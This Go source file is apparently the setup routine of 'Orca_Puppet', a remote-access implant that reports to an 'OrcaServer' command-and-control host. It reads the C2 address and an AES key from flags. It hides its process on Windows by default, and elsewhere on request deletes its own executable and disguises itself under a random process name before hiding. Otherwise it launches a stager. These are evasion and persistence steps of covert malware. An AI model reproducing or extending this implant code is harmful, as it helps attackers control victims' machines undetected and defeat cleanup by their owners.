package setting

import (
	"Orca_Puppet/define/api"
	"Orca_Puppet/define/config"
	"Orca_Puppet/define/debug"
	"Orca_Puppet/define/hide"
	"Orca_Puppet/stager"
	"Orca_Puppet/tools/util"
	"flag"
	"fmt"
	"net"
	"os"
	"runtime"
)

func SetUp() {
	isDebug := flag.Bool("debug", false, "Enable debug")
	isHide := flag.Bool("hide", false, "Enable hide")
	host := flag.String("host", api.ParseHost(), "server host")
	key := flag.String("key", config.AesKey, "decrypt key")
	flag.Parse()
	debug.IsDebug = *isDebug
	_, err := net.ResolveTCPAddr("tcp4", *host)
	if err != nil {
		message := fmt.Sprintf("Invalid OrcaServer TCP address [%s]", err)
		debug.DebugPrint(message)
		os.Exit(1)
	}
	api.InitApi(*host)
	config.AesKey = *key
	if runtime.GOOS == "windows" {
		hide.Hide("hide")
		return
	}
	if *isHide {
		for i, arg := range os.Args {
			if arg == "-hide" {
				os.Args = append(os.Args[:i], os.Args[i+1:]...)
			}
		}
		path, _ := util.GetExecPathEx()
		defer os.Remove(path)
		name := util.GetRandomProcessName()
		hide.Hide(name)
	} else {
		stager.Init()
	}
}
